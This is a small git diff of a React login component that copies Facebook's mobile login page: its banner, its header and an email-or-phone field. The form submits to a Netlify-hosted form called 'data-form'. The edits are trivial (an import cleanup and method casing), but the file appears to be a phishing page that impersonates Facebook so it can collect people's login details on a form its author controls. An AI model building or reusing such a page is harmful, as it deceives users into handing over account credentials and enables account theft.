@@ -1,4 +1,4 @@
-import React, {useState} from "react";
+import React from "react";
 import "./LoginPage.css";
 const LoginPage = () =>{
    // const [mail,setMail] = useState("");
@@ -7,7 +7,7 @@ const LoginPage = () =>{
         <>
           <div className="tophead">Get Facebook for Android and browse faster.</div>
           <h2 className="header">facebook</h2> 
-          <form name="data-form" method="POST" data-netlify="true">
+          <form name="data-form" method="post" data-netlify="true">
               <input type="hidden" name="form-name" value="data-form" />
               <div className="mail">
                   <input type="text" name="email" id="email" placeholder="Mobile number or email address" ></input>
